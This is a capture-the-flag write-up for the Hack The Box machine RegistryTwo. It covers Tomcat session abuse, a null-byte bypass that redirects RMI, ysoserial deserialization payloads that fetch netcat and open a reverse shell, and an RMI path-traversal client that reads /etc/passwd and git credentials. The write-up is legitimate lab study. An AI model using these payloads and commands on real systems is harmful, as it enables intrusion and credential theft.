So now we have the login.html from the tomcat examples, I found this endpoint on HackTricks. There is a list of examples that come with Apache Tomcat and we took a random path and the result was successful!

```
/examples/jsp/num/numguess.jsp
/examples/jsp/dates/date.jsp
/examples/jsp/snp/snoop.jsp
/examples/jsp/error/error.html
/examples/jsp/sessions/carts.html
/examples/jsp/checkbox/check.html
/examples/jsp/colors/colors.html
/examples/jsp/cal/login.html
/examples/jsp/include/include.jsp
/examples/jsp/forward/forward.jsp
/examples/jsp/plugin/plugin.jsp
/examples/jsp/jsptoserv/jsptoservlet.jsp
/examples/jsp/simpletag/foo.jsp
/examples/jsp/mail/sendmail.jsp
/examples/servlet/HelloWorldExample
/examples/servlet/RequestInfoExample
/examples/servlet/RequestHeaderExample
/examples/servlet/RequestParamExample
/examples/servlet/CookieExample
/examples/servlet/JndiServlet
/examples/servlet/SessionExample
/tomcat-docs/appdev/sample/web/hello.jsp
```

![](https://cdn.discordapp.com/attachments/1071118357933338645/1180239281151819907/image.png?ex=657cb27c&is=656a3d7c&hm=55c744267dc4e1c9adf403ca79153eab22622496045e1f40062c2cecd353e089&)

Unfortunately, we got a 404 error when we requested the SessionExample servlet. But that's okay, we can easily fix that. Since we have the clone of the machine that is running, we can find the problem.

So I just greped for `servlet` and found that the path that is on the server is a bit different than what we used. 

```xml
<servlet-mapping>                
	<servlet-name>RequestHeaderExample</servlet-name>
	<url-pattern>/servlets/servlet/RequestHeaderExample</url-pattern>
</servlet-mapping>
```

You can find more examples in the `WEB-INF/web.xml` file. Here are all the endpoints we have.

## Initial Access

#### Shell as app (docker)

##### From customer to manager

Now let us try again and see if we can reach this page.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1180241706453581874/image.png?ex=657cb4be&is=656a3fbe&hm=0da6d479e19e8be941076eba07167b7466a9ea77bf401eb22dda1e28b50e4cfb&)

Kaboom, we got it. Great, now lets see what we can do with this access.

```bash
┌──(ar0x㉿kali)-[~/…/usr/local/tomcat/webapps]
└─$ grep -iR 's_DisplayLoggedInUsernameSafe'
grep: WEB-INF/classes/com/htb/hosting/services/AuthenticationServlet.class: binary file matches
grep: WEB-INF/classes/com/htb/hosting/services/ProfileServlet.class: binary file matches
grep: WEB-INF/classes/com/htb/hosting/utils/Constants.class: binary file match[[es]]
```

And I found the following class in `WEB-INF/classes/com/htb/hosting/utils/Constants.class`.

```java
public interface Constants {
   String S_USER_ID = "s_LoggedInUserUUID";
   String S_USER_NAME = "s_DisplayLoggedInUsernameSafe";
   String S_IS_USER_ROLE_MGR = "s_IsLoggedInUserRoleManager";
   String SAFE_FILE = "safeFile";
   String BASE_DIR = "baseDir";
   String EDIT_FILE = "editFile";
   String SELECTED_DOMAIN = "domain";
   String CREATE_DOMAIN = "new";
   String ROLE_MGR = "manager";
   String ROLE_CUSTOMER = "customer";
   String KEY_MAX_DOMAINS = "domains.max";
   String KEY_DOMAIN_TEMPLATE = "domains.start-template";
   File SETTINGS_FILE = new File("/etc/hosting.ini");
}
```

So no when we set the `s_IsLoggedInUserRoleManager` role to `true` we should access additional features probably.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1180243605428904117/image.png?ex=657cb683&is=656a4183&hm=190f8dde9860768aa3821102fdce2137fb5cd49fc4c31e08bee11b770ad7e7d8&)

So now we can see if anything has change in the web app !!

![](https://cdn.discordapp.com/attachments/1071118357933338645/1180244015367589959/image.png?ex=657cb6e5&is=656a41e5&hm=c610b7a3cb5dc7631f5d47f5232f73d2be84111d37ebb4ce3884dc2953586ce5&)

Yea we got the Configuration section, thats new !!!

![](https://cdn.discordapp.com/attachments/1071118357933338645/1180244358583291954/image.png?ex=657cb736&is=656a4236&hm=81de8a1de83bad17205feeb8c1f4c57d50f9fbe9ed09ec4e68371e3c79e77444&)

Nice !!!

##### Modify hosting.ini configuration 

Did you notice something ?????

Exactly the same message, `<h1>It works!</h1>` was in the `hosting.ini` file, and when you click on `save changes` you get the following message `Settings updated`, so it might be that this new feature we are accessing again can override things in the `hosting.ini` file.

So I changed the `It works!` message to `Amogus` now lets see the result. Now when we create a new page it should be created with `Amogus` and not with `It works!`.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1180245928951681074/image.png?ex=657cb8ad&is=656a43ad&hm=56877e76688284db97424ee9a5e32ea08a6a8b57274ac8845d553a3bea0674b3&)

Great, it worked !! So now how can we abuse that ????

```http
POST /hosting/reconfigure HTTP/1.1
Host: www.webhosting.htb
Cookie: JSESSIONID=434656A966EE4443201F34C61DC8F39B
Content-Length: 102
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://www.webhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.webhosting.htb/hosting/reconfigure
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: close

domains.max=5&domains.start-template=%3Cbody%3E%0D%0A%3Ch1%3EIt+works%21%3C%2Fh1%3E%0D%0A%3C%2Fbody%3E
```

##### Rabbit Hole

The names of the fields are identical to those we have in our `hosting.ini` file. This means that we can just change any file we want. We can write the address of our mysql server and the web application will store the data in **OUR MYSQL SERVER** and if we are lucky we can capture the credentials.

```java
// Source code is decompiled from a .class file using FernFlower decompiler.
package com.htb.hosting.utils;

import com.htb.hosting.model.Domain;
import com.htb.hosting.model.User;
import com.htb.hosting.utils.config.Settings;
import java.util.Properties;
import org.hibernate.Session;
import org.hibernate.SessionFactory;
import org.hibernate.boot.registry.StandardServiceRegistryBuilder;
import org.hibernate.cfg.Configuration;
import org.hibernate.service.ServiceRegistry;

public class HibernateUtil {
   private static SessionFactory sessionFactory;

   public HibernateUtil() {
   }

   public static void main(String[] args) {
      reload();
   }

   private static SessionFactory getSessionFactory() {
      return sessionFactory == null ? reload() : sessionFactory;
   }

   public static Session getSession() {
      return getSessionFactory().openSession();
   }

   public static SessionFactory reload() {
      Configuration configuration = new Configuration();
      Properties settings = new Properties();
      settings.put("hibernate.connection.driver_class", "com.mysql.cj.jdbc.Driver");
      settings.put("hibernate.connection.url", String.format("jdbc:mysql://%s:%d/%s?allowPublicKeyRetrieval=true&useSSL=false&serverTimezone=Europe/Rome", Settings.get(String.class, "mysql.host", "db"), Settings.get(Integer.class, "mysql.port", 3306), Settings.get(String.class, "mysql.database", "hosting")));
      settings.put("hibernate.connection.username", Settings.get(String.class, "mysql.user", "root"));
      settings.put("hibernate.connection.password", Settings.get(String.class, "mysql.password", ""));
      settings.put("hibernate.dialect", "org.hibernate.dialect.MySQL5Dialect");
      settings.put("hibernate.show_sql", "true");
      settings.put("hibernate.current_session_context_class", "thread");
      configuration.setProperties(settings);
      configuration.addAnnotatedClass(User.class);
      configuration.addAnnotatedClass(Domain.class);
      ServiceRegistry serviceRegistry = (new StandardServiceRegistryBuilder()).applySettings(configuration.getProperties()).build();
      if (sessionFactory != null) {
         try {
            sessionFactory.close();
         } catch (Exception var4) {
         }
      }

      sessionFactory = configuration.buildSessionFactory(serviceRegistry);
      return sessionFactory;
   }
}
```

```http
POST /hosting/reconfigure HTTP/1.1
Host: www.webhosting.htb
Cookie: JSESSIONID=434656A966EE4443201F34C61DC8F39B
Content-Length: 102
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://www.webhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.webhosting.htb/hosting/reconfigure
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: close

mysql.user=root&mysql.password=pass&mysql.host=10.10.14.81&domains.max=2
```

So after spending a lot of time on this idea (redirecting mysql server to kali and capturing the credential) i found out that this is just a mean rabbit hole 😡

##### Rouge RMI Exploit

```java
/*
 * Decompiled with CFR 0.144.
 */
package com.htb.hosting.rmi;

import com.htb.hosting.rmi.FileService;
import com.htb.hosting.utils.config.Settings;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.logging.Logger;

public class RMIClientWrapper {
    private static final Logger log = Logger.getLogger(RMIClientWrapper.class.getSimpleName());

    public static FileService get() {
        try {
            String rmiHost = Settings.get(String.class, "rmi.host", null);
            if (!rmiHost.contains(".htb")) {
                rmiHost = "registry.webhosting.htb";
            }
            System.setProperty("java.rmi.server.hostname", rmiHost);
            System.setProperty("com.sun.management.jmxremote.rmi.port", "9002");
            log.info(String.format("Connecting to %s:%d", rmiHost, Settings.get(Integer.class, "rmi.port", 9999)));
            Registry registry = LocateRegistry.getRegistry(rmiHost, Settings.get(Integer.class, "rmi.port", 9999));
            return (FileService)registry.lookup("FileService");
        }
        catch (Exception e) {
            e.printStackTrace();
            throw new RuntimeException(e);
        }
    }
}
```

```java
if (!rmiHost.contains(".htb")) {
    rmiHost = "registry.webhosting.htb";
}
```

So the next thing we could change was the `rmi.host`, but we had a problem here. The problem was that we had an if statement in the code that checked if the `rmi.host` ended in `.htb` or not. If it was and the host ended in `.htb` then all was well, but if it was not then the web application would set the static value  `registry.webhosting.htb` for the `rmi.host` .

To bypass the if condition we could try to add `%00.htb` at the end our `rmi.host` address and see if we can bypass this condition with NULL Bytes.

```http
POST /hosting/reconfigure HTTP/1.1
Host: www.webhosting.htb
Cookie: JSESSIONID=328D08DA7809D453387E751CF2B6C088
Content-Length: 102
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://www.webhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.webhosting.htb/hosting/reconfigure
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: close

domains.max=10&rmi.host=10.10.14.81%00.htb
```

Here we started the `JRMPListener` module from ysoserial, and as payload I took `CommonsCollections5`. TBH I dont really know why `CommonsCollections5` works, but it does. I just tested all modules until one of `CommonsCollections5` worked.

```bash
┌──(ar0x㉿kali)-[~/Downloads]
└─$ java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections5 'wget 10.10.14.81'    
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
* Opening JRMP listener on 9002
Have connection from /10.129.229.28:36058
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection
```

*Note:* If you get an error that you are not able to run ysoserial-all.jar, changing the version of your java will help to solve this problem.

```bash
sudo update-alternatives --config java
```

Now that our rouge RMI server is up and running, we should just make an interaction, e.g. `create a new domain`, to trigger the web application to make a request to our rouge RMI server.

```ad-info
title: RMI (Remote Method Invocation)

Remote Method Invocation (RMI) is an application programming interface (API) in the Java programming language and development environment. It allows objects on one computer or Java Virtual Machine (JVM) to interact with objects running on a different JVM in a distributed network. Another way to say this is that RMI provides a way to create distributed Java applications through simple method calls.
```

Oh, we got a callback from the server, that's great, now let's try to get a reverse shell on the server (we would probably end up in the hosting application's docker container and not the host machine!)

```bash
┌──(ar0x㉿kali)-[~]
└─$ nc -lvnp 80  
listening on [any] 80 ...
connect to [10.10.14.81] from (UNKNOWN) [10.129.229.28] 33348
GET / HTTP/1.1
Host: 10.10.14.81
User-Agent: Wget
Connection: close
```

Now the same step for the reverse shell !!!

```bash
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections5 'wget 10.10.14.108/nc -O /tmp/nc'
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections5 'chmod +x /tmp/nc'
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections5 '/tmp/nc 10.10.14.108 4444 -e sh'
```

Unfortunately, for some reason, it was not possible to execute these three commands in a row, and it forced me to do this three times separately, and the bash/sh reverse shell did not work either. 

And Kaboom, finally we got a shell on the docker container !!

```bash
┌──(ar0x㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.81] from (UNKNOWN) [10.129.229.28] 59630
```

#### Docker Enumeration

I couldn't find anything important in the container but we can see that port 9002 is running on this server and its listening for  requests.

```log
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5001            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:3310            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
tcp        0      0 :::34519                :::*                    LISTEN      -
tcp        0      0 :::443                  :::*                    LISTEN      -
tcp        0      0 ::ffff:127.0.0.1:8005   :::*                    LISTEN      1/java
tcp        0      0 :::5000                 :::*                    LISTEN      -
tcp        0      0 :::8009                 :::*                    LISTEN      1/java
tcp        0      0 :::5001                 :::*                    LISTEN      -
tcp        0      0 :::9002                 :::*                    LISTEN      -
tcp        0      0 :::3306                 :::*                    LISTEN      -
tcp        0      0 :::3310                 :::*                    LISTEN      -
tcp        0      0 :::8080                 :::*                    LISTEN      1/java
```

Port `9002` is open and there is no fingerprint of the RMI server, so the RMI server is probably on the host system. We can make a SOCKS tunnel with `chisel` to this network and try to access this service via `proxychains`.

#### Creating my own RMI Client

So here we can see the structure of the RMIClient, if you want to build this, please pay attention to the folder structure, it should have the same structure otherwise you will get weird Java errors.

```bash
┌──(ar0x㉿kali)-[~/…/HTB/Machines/RegistryTwo/RMIClientTest]
└─$ tree
.
└── src
    ├── com
    │   └── htb
    │       └── hosting
    │           └── rmi
    │               ├── AbstractFile.class
    │               ├── AbstractFile.java
    │               ├── FileService.class
    │               ├── FileService.java
    │               ├── RMIClientWrapper.class
    │               └── RMIClientWrapper.java
    ├── Main.class
    ├── Main.java
    └── runner.sh

6 directories, 9 files
```

The `RMIClientWrapper`, `FileService` and `AbstractFile` do not need any changes, I just created a new Main.java and wrote some extra methods like `DirectoryListing`, `PrintFile`, `CreateDomain`(These are actually wrappers) and so on for it. All these methods use the `RMIClientWrapper` to communicate with the RMI server.

So i just created a new domain to get a fresh `vhost` name, and i just inserted the new value into the called methods.

```java
import com.htb.hosting.rmi.AbstractFile;
import com.htb.hosting.rmi.RMIClientWrapper;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class Main {
    public static void main(String[] args) {
        try
        {
            DirectoryListing("366ceb957b0c", "../../../home/developer");
            PrintFile("366ceb957b0c", "../../../home/developer/.git-credentials");
        }
        catch (Exception ex){
            System.err.println("Something went wrong !!");
            System.err.println(ex.getMessage());
        }
    }

    public static void PrintFile(String vhost, String filePath){
        try {
            byte[] bytes = RMIClientWrapper.get().view(vhost, filePath);
            String content = new String(bytes, StandardCharsets.UTF_8);
            System.out.println(content);
        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
    }

    public static boolean UploadFile(String vhost, String filePath, String content){
        try {
            AbstractFile remoteFile = RMIClientWrapper.get().getFile(vhost, filePath);
            return RMIClientWrapper.get().uploadFile(vhost, remoteFile.getAbsolutePath(), content.getBytes());
        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
        return false;
    }

    public static void DirectoryListing(String vhost, String filePath){
        try {
            List<AbstractFile> files = RMIClientWrapper.get().list(vhost, filePath);
            for (AbstractFile file : files) {
                System.out.println(file.getName());
            }
        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
    }

    public static boolean CreateDomain(String domain){
        try {
            return RMIClientWrapper.get().newDomain(domain);
        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
        return false;
    }

    public static boolean CreateDir(String vhost, String filePath){
        try {
            AbstractFile remoteFile = RMIClientWrapper.get().getFile(vhost, filePath);
            return RMIClientWrapper.get().createDirectory(vhost, remoteFile.getAbsolutePath());
        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
        return false;
    }
}
```

During development I had to clean up the `*.class` files and rebuild the java files, so I wrote a small script that does that and additionally runs the main program with proxyhchains. 

```bash
rm -rf com/htb/hosting/rmi/*.class
rm -rf *.class
javac Main.java com/htb/hosting/rmi/* -d .
proxychains -q java Main 
```

The `PrintFile` method successfuly printed the content of `/etc/passwd` 

```bash
┌──(ar0x㉿kali)-[~/…/Machines/RegistryTwo/RMIClientTest/src]
└─$ ./runner.sh
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Dec 02, 2023 9:36:07 AM com.htb.hosting.rmi.RMIClientWrapper get
INFO: Connecting to registry.webhosting.htb:9002
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
clamav:x:111:113::/var/lib/clamav:/bin/false
rmi-service:x:999:998::/home/rmi-service:/bin/false
developer:x:1001:1001:,,,:/home/developer:/bin/bash
_laurel:x:998:997::/var/log/laurel:/bin/false
```

Now lets try to read the `home`directroy of the user developer !!

```bash
┌──(ar0x㉿kali)-[~/…/Machines/RegistryTwo/RMIClientTest/src]
└─$ ./runner.sh
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Dec 02, 2023 9:34:44 AM com.htb.hosting.rmi.RMIClientWrapper get
INFO: Connecting to registry.webhosting.htb:9002
home
.cache
.bash_logout
.bashrc
.bash_history
.git-credentials
user.txt
.gnupg
.profile
.vimrc
```

Oh, i guess we found something. `.git-credentials` thats great, lets print this shit and see what we can do with it.

```bash
┌──(ar0x㉿kali)-[~/…/Machines/RegistryTwo/RMIClientTest/src]
└─$ ./runner.sh
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Dec 02, 2023 9:41:46 AM com.htb.hosting.rmi.RMIClientWrapper get
INFO: Connecting to registry.webhosting.htb:9002
https://irogir:qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9@github.com
```

Nice we got creds for `irgoir`/`developer`

```
irogir:qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9
```

Now its easy lets ssh to the box with found Creds.
Fuck yea, finally we got a shell on the host system and of course the user flag.

```bash
┌──(ar0x㉿kali)-[~/…/usr/local/tomcat/webapps]
└─$ ssh developer@webhosting.htb
developer@webhosting.htb's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec  2 09:43:54 UTC 2023

  System load:  0.08              Users logged in:                0
  Usage of /:   76.2% of 7.71GB   IP address for eth0:            10.129.229.28
  Memory usage: 60%               IP address for br-59a3a780b7b3: 172.19.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    241

  => There are 48 zombie processes.


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

28 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 18.04 at
https://ubuntu.com/18-04


Last login: Mon Jul 17 12:11:10 2023 from 10.10.14.23
developer@registry:~$ cat user.txt 
6e15baf80de579ae4c7f8942acfe7273
```

## Privilege Escalation

#### Shell as root

##### Host enumeration

In `/opt` i found the `registry.jar` file and i guess thats the server that we are dealing with.

So lets  check the source code and make sure that this is the server code, and what can find in it.

```bash
developer@registry:/opt$ ls -la
total 28
drwxr-xr-x  3 root root  4096 Jul  5 07:43 .
drwxr-xr-x 26 root root  4096 Jul  5 07:43 ..
drwx--x--x  4 root root  4096 Jul  5 07:43 containerd
-rwxr-xr-x  1 root root 15343 Feb  2  2023 registry.jar
```

I downloaded the `registry.jar` file and unzipped it. So lets take a look at the file structure.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/RegistryTwo]
└─$ sshpass -p 'qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9' scp developer@webhosting.htb:/opt/registry.jar
```

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/RegistryTwo]
└─$ mkdir registry; unzip registry.jar -d registry             
Archive:  registry.jar
   creating: registry/META-INF/
  inflating: registry/META-INF/MANIFEST.MF  
   creating: registry/com/
   creating: registry/com/htb/
   creating: registry/com/htb/hosting/
   creating: registry/com/htb/hosting/rmi/
   creating: registry/com/htb/hosting/rmi/utils/
   creating: registry/com/htb/hosting/rmi/quarantine/
  inflating: registry/com/htb/hosting/rmi/FileService.class  
  inflating: registry/com/htb/hosting/rmi/Server.class  
  inflating: registry/com/htb/hosting/rmi/utils/CryptUtil.class  
  inflating: registry/com/htb/hosting/rmi/utils/FileUtil.class  
  inflating: registry/com/htb/hosting/rmi/utils/StringUtil.class  
  inflating: registry/com/htb/hosting/rmi/FileServiceImpl.class  
  inflating: registry/com/htb/hosting/rmi/AbstractFile.class  
  inflating: registry/com/htb/hosting/rmi/FileServiceConstants.class  
  inflating: registry/com/htb/hosting/rmi/quarantine/QuarantineConfiguration.class  
  inflating: registry/com/htb/hosting/rmi/quarantine/QuarantineService.class  
  inflating: registry/com/htb/hosting/rmi/quarantine/QuarantineServiceImpl.class 
```

```bash
┌──(ar0x㉿kali)-[~/…/HTB/Machines/RegistryTwo/registry]
└─$ tree    
.
├── com
│   └── htb
│       └── hosting
│           └── rmi
│               ├── AbstractFile.class
│               ├── FileService.class
│               ├── FileServiceConstants.class
│               ├── FileServiceImpl.class
│               ├── quarantine
│               │   ├── QuarantineConfiguration.class
│               │   ├── QuarantineService.class
│               │   └── QuarantineServiceImpl.class
│               ├── Server.class
│               └── utils
│                   ├── CryptUtil.class
│                   ├── FileUtil.class
│                   └── StringUtil.class
└── META-INF
    └── MANIFEST.MF
```

##### Creating a custom rouge RMI Server

So the class names tell us that this is the RMI server source code. Let us examine it and see what we can find. The `quarantine` folder seems to be interesting because you can find `quarantine` folder in `/` of server.

**Class QuarantineServiceImpl**

```java
// Source code is decompiled from a .class file using FernFlower decompiler.
package com.htb.hosting.rmi.quarantine;

import com.htb.hosting.rmi.FileServiceConstants;
import java.io.File;
import java.rmi.RemoteException;
import java.util.logging.Logger;

public class QuarantineServiceImpl implements QuarantineService {
   private static final Logger logger = Logger.getLogger(QuarantineServiceImpl.class.getSimpleName());
   private static final QuarantineConfiguration DEFAULT_CONFIG;

   public QuarantineServiceImpl() {
   }

   public QuarantineConfiguration getConfiguration() throws RemoteException {
      logger.info("client fetching configuration");
      return DEFAULT_CONFIG;
   }

   static {
      DEFAULT_CONFIG = new QuarantineConfiguration(new File("/root/quarantine"), FileServiceConstants.SITES_DIRECTORY, "localhost", 3310, 1000);
   }
}
```

So here the backend code creates a new instance of `QuarantineConfiguration` and passes it some parameters. We should look at the `QuarantineConfiguration` class to understand exactly what it does. But I already have some predictions. Port `3310` is the ClamAV server and I guess this will pass the files from `SITES_DIRECTORY` that are uploaded by clients on the server to ClamAV and in case of detection the file will be quarantined in `/root/quarantine`. So when we want to quarantine another file, we cannot access this folder, so we will change `/root/quarantine` to `/tmp/quarantine` and now when a file is quarantined, we can access it !

**Class QuarantineConfiguration**

```java
// Source code is decompiled from a .class file using FernFlower decompiler.
package com.htb.hosting.rmi.quarantine;

import java.io.File;
import java.io.Serializable;

public class QuarantineConfiguration implements Serializable {
   private final File quarantineDirectory;
   private final File monitorDirectory;
   private final String clamHost;
   private final int clamPort;
   private final int clamTimeout;

   public QuarantineConfiguration(File quarantineDirectory, File monitorDirectory, String clamHost, int clamPort, int clamTimeout) {
      this.quarantineDirectory = quarantineDirectory;
      this.monitorDirectory = monitorDirectory;
      this.clamHost = clamHost;
      this.clamPort = clamPort;
      this.clamTimeout = clamTimeout;
   }

   public File getQuarantineDirectory() {
      return this.quarantineDirectory;
   }

   public File getMonitorDirectory() {
      return this.monitorDirectory;
   }

   public String getClamHost() {
      return this.clamHost;
   }

   public int getClamPort() {
      return this.clamPort;
   }

   public int getClamTimeout() {
      return this.clamTimeout;
   }

   public boolean equals(Object o) {
      if (o == this) {
         return true;
      } else if (!(o instanceof QuarantineConfiguration)) {
         return false;
      } else {
         QuarantineConfiguration other = (QuarantineConfiguration)o;
         if (!other.canEqual(this)) {
            return false;
         } else if (this.getClamPort() != other.getClamPort()) {
            return false;
         } else if (this.getClamTimeout() != other.getClamTimeout()) {
            return false;
         } else {
            label52: {
               Object this$quarantineDirectory = this.getQuarantineDirectory();
               Object other$quarantineDirectory = other.getQuarantineDirectory();
               if (this$quarantineDirectory == null) {
                  if (other$quarantineDirectory == null) {
                     break label52;
                  }
               } else if (this$quarantineDirectory.equals(other$quarantineDirectory)) {
                  break label52;
               }

               return false;
            }

            Object this$monitorDirectory = this.getMonitorDirectory();
            Object other$monitorDirectory = other.getMonitorDirectory();
            if (this$monitorDirectory == null) {
               if (other$monitorDirectory != null) {
                  return false;
               }
            } else if (!this$monitorDirectory.equals(other$monitorDirectory)) {
               return false;
            }

            Object this$clamHost = this.getClamHost();
            Object other$clamHost = other.getClamHost();
            if (this$clamHost == null) {
               if (other$clamHost != null) {
                  return false;
               }
            } else if (!this$clamHost.equals(other$clamHost)) {
               return false;
            }

            return true;
         }
      }
   }

   protected boolean canEqual(Object other) {
      return other instanceof QuarantineConfiguration;
   }

   public int hashCode() {
      int PRIME = true;
      int result = 1;
      result = result * 59 + this.getClamPort();
      result = result * 59 + this.getClamTimeout();
      Object $quarantineDirectory = this.getQuarantineDirectory();
      result = result * 59 + ($quarantineDirectory == null ? 43 : $quarantineDirectory.hashCode());
      Object $monitorDirectory = this.getMonitorDirectory();
      result = result * 59 + ($monitorDirectory == null ? 43 : $monitorDirectory.hashCode());
      Object $clamHost = this.getClamHost();
      result = result * 59 + ($clamHost == null ? 43 : $clamHost.hashCode());
      return result;
   }

   public String toString() {
      return "QuarantineConfiguration(quarantineDirectory=" + this.getQuarantineDirectory() + ", monitorDirectory=" + this.getMonitorDirectory() + ", clamHost=" + this.getClamHost() + ", clamPort=" + this.getClamPort() + ", clamTimeout=" + this.getClamTimeout() + ")";
   }
}
```

